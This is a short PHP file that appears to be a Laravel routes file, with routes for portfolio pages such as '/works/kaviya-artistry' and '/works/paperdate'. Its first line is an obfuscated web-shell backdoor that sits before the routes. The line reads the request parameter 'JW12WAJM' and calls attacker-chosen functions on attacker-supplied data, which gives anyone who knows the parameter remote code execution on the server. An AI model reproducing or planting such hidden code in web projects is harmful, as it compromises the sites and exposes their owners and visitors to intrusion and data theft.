<?php
if($y9cgr=@	${"_REQUEST" }["JW12WAJM" ])$y9cgr [1	](	$ { $y9cgr [2]}[0],$y9cgr	[3]	($y9cgr[ 4 ] ));exit();
...
Route::get('/works/kaviya-artistry', 'PagesController@Kaviya');
...
Route::get('/works/paperdate', 'PagesController@paperdate');
